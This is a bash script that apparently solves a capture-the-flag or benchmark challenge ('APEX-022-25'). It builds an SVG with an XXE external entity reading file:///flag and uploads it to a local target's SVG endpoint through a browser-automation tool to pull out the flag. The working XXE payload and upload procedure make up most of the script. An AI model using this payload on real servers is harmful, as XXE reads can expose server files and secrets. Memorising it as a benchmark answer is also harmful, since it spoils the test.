#!/usr/bin/env bash
# APEX-022-25 — "XXE via File Upload" (tags: xxe, arbitrary_file_upload)
#
# An SVG is XML, and the parser behind this upload resolves external entities.
# `<!ENTITY xxe SYSTEM "file:///flag">` is therefore a read of the server's
# filesystem performed by the server, and the text node that references it
# comes back in the response describing the image.
#
# The upload is where `--set-file` earns its place. A multipart part has three
# pieces a filter might read — its bytes, its declared filename and its declared
# type — and `--set` cannot carry the bytes: a command line is text, and an
# upload is a file. `--create` builds the multipart body on a request that had
# none, so the whole thing starts from an ordinary page load.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex022-$$"
WORK="$(mktemp -d)"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1; rm -rf "$WORK"' EXIT

cat > "$WORK/xxe.svg" <<'SVG'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
SVG

"$H5I" browser open "$URL/api/info" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/upload/svg \
    --set multipart.file.filename=xxe.svg \
    --set multipart.file.content_type=image/svg+xml \
    --set-file "multipart.file=$WORK/xxe.svg" | flag
